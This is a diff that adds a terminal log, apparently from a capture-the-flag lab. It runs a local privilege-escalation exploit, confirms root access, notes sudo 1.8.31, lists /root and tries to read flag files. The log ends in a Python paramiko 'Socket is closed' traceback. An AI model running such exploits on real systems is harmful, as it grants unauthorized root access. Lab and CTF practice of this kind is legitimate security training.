@@ -1,0 +1,38 @@
+cd /run/lock/cpt && ./exploit
+# 
+$ id
+id
+uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
+# 
+$ hostname; uname -a
+hostname; uname -a
+c389ff99c726
+Linux c389ff99c726 6.8.0-136-generic #136~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  3 16:29:11 UTC  x86_64 x86_64 x86_64 GNU/Linux
+# 
+$ sudo --version | head -1
+sudo --version | head -1
+Sudo version 1.8.31
+# 
+$ ls -la /root/
+ls -la /root/
+total 20
+drwx------ 1 root root 4096 Oct 11 02:33 .
+drwxr-xr-x 1 root root 4096 Oct 11 02:49 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+-rw------- 1 root root   54 Oct 11 02:33 root.txt
+# 
+$ for f in /root/root.txt /root/flag.txt /root/flag; do echo "--- $f ---"; cat "$f" 2>/dev/null; echo; done
+Traceback (most recent call last):
+  File "/home/boss/Works/ctf/KPMG/VodooSpiritOfDeath2/scripts/root_capture.py", line 70, in <module>
+    main()
+    ~~~~^^
+  File "/home/boss/Works/ctf/KPMG/VodooSpiritOfDeath2/scripts/root_capture.py", line 64, in main
+    chan.send(cmd + "\n")
+    ~~~~~~~~~^^^^^^^^^^^^
+  File "/home/boss/.local/lib/python3.14/site-packages/paramiko/channel.py", line 799, in send
+    return self._send(s, m)
+           ~~~~~~~~~~^^^^^^
+  File "/home/boss/.local/lib/python3.14/site-packages/paramiko/channel.py", line 1196, in _send
+    raise socket.error("Socket is closed")
+OSError: Socket is closed
